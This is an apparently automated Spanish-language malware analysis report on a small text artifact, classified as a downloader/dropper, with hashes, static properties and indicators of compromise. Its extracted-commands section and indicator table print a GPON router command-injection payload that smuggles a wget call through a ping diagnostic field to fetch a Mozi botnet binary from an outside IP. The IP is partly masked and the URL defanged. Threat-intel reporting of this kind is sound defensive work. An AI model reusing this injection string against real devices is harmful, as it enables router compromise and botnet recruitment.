# 🧬 Payload Analysis

`e3cd1654bec0ae01f4774f8233a7612cc19c687138eea10a5c71e6167b972eeb`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:43:14+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `e3cd1654bec0ae01f4774f8233a7612cc19c687138eea10a5c71e6167b972eeb`
- **SHA1:** `b640771e2e5a801d05006b8517f3b5643466a0cf`
- **MD5:** `740e0ae1ea773cb0b6ce785eb34cafcc`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 139 B |
| Entropía | 5.09 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://124.29.247.XXX:48921/Mozi.m+-O+->/tmp/gpon80;s
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 124.29.247.XXX | static_analysis |
| url | hxxp://124.29.247.XXX:48921/Mozi.m+-O+- | strings |
| hash | e3cd1654bec0ae01f4774f8233a7612cc19c687138eea10a5c71e6167b972eeb | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://124.29.247.XXX:48921/Mozi.m+-O+->/tmp/gpon80;s | strings |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
